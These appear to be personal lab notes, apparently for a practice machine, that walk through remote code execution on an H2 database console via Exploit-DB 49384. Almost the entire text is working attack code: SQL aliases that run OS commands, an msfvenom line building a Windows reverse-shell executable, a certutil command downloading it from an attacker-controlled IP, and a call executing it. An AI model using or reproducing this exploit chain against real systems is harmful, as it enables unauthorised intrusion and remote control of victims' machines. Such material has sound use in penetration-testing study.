https://www.exploit-db.com/exploits/49384
1 by 1, put in each SQL command into the text box and hit run.
Test to make sure RCE works with whoami:
```sql H2
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\Z").next()');
```
Look to bottom of window for response:
`jacko\tony`
```sql H2
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd /c dir C:\\").getInputStream()).useDelimiter("\\Z").next()');
```
```sql H2
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd /c dir C:\\").getInputStream()).useDelimiter("\\Z").next()');
```
```bash - kali
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=80 -f exe > reverse64.exe
```
```sql H2
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -split -f http://192.168.49.125/reverse64.exe C:\\Users\\tony\\Desktop\\reverse64.exe").getInputStream()).useDelimiter("\\Z").next()');
```
![[1._rlwrap]]
```sql H2
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\Users\\tony\\Desktop\\reverse64.exe").getInputStream()).useDelimiter("\\Z").next()');
```